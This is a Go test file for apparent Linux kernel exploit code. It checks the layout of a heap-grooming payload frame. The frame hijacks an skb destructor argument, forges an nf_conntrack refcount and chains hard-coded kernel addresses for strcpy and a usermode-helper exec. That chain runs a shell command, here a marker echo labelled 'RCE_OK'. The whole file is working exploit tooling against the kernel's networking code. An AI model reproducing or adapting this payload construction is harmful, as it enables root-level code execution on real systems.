package main

import (
	"bytes"
	"encoding/binary"
	"testing"
)

func TestStalePageGroomFrameUsermodeHelperLayout(t *testing.T) {
	const (
		head     = uint64(0xffffa0e9822c8000)
		strcpy   = uint64(0xffffffffb8e2aa30)
		exec     = uint64(0xffffffffb8317cc0)
		noop     = uint64(0xffffffffb8295590)
		uargAt   = 120
		copyLen  = 116
		fakeUarg = uint64(184)
	)
	frame, err := stalePageGroomFrame(0x6b, head, 0, 0, 0, strcpy, 0, exec, noop,
		"echo BENGSKY_RCE_OK >/tmp/bengsky-rce")
	if err != nil {
		t.Fatal(err)
	}
	if got := len(frame); got != 3456 {
		t.Fatalf("frame length=%d, want 3456", got)
	}
	source := frame[uargAt : uargAt+copyLen]
	if at := bytes.IndexByte(source, 0); at >= 0 {
		t.Fatalf("strcpy source contains an early NUL at byte %d", at)
	}
	if got := frame[uargAt+copyLen]; got != 0 {
		t.Fatalf("strcpy terminator=%#x, want 0", got)
	}

	want64 := map[int]uint64{
		0:   head + fakeUarg + 80,
		8:   head + 0x311,
		16:  head + 0x911,
		24:  head + 0x331,
		32:  head + 0x820,
		40:  head + 0x511,
		48:  head + 0x711,
		56:  head + 0x791,
		72:  noop,
		80:  strcpy,
		88:  head + 0x551,
		96:  exec,
		104: head + 0xb11,
	}
	for offset, want := range want64 {
		if got := binary.LittleEndian.Uint64(source[offset : offset+8]); got != want {
			t.Errorf("source[%d]=%#x, want %#x", offset, got, want)
		}
	}
	if got := binary.LittleEndian.Uint32(source[112:116]); got != 0x7f7f7f7f {
		t.Errorf("oversized skb len=%#x, want 0x7f7f7f7f", got)
	}
	if got := binary.LittleEndian.Uint64(frame[104:112]); got != head+fakeUarg {
		t.Errorf("destructor_arg=%#x, want %#x", got, head+fakeUarg)
	}
	if got := binary.LittleEndian.Uint32(frame[0xb10-64 : 0xb10-60]); got != 0x02020202 {
		t.Errorf("fake nf_conntrack refcount=%#x, want 0x02020202", got)
	}
}

func TestStalePageGroomFrameFragmentDescriptor(t *testing.T) {
	const page = uint64(0xffffd246c008b200)
	frame, err := stalePageGroomFrame(0x6b, 0, page, 0, 0, 0, 0, 0, 0, "")
	if err != nil {
		t.Fatal(err)
	}
	if got := binary.LittleEndian.Uint64(frame[104:112]); got != 0 {
		t.Fatalf("destructor_arg=%#x, want zero", got)
	}
	if got := binary.LittleEndian.Uint64(frame[112:120]); got != page {
		t.Fatalf("frags[0].netmem=%#x, want %#x", got, page)
	}
	if got := binary.LittleEndian.Uint32(frame[120:124]); got != 1 {
		t.Fatalf("frags[0].len=%d, want 1", got)
	}
	if got := binary.LittleEndian.Uint32(frame[124:128]); got != 0 {
		t.Fatalf("frags[0].offset=%d, want 0", got)
	}
}
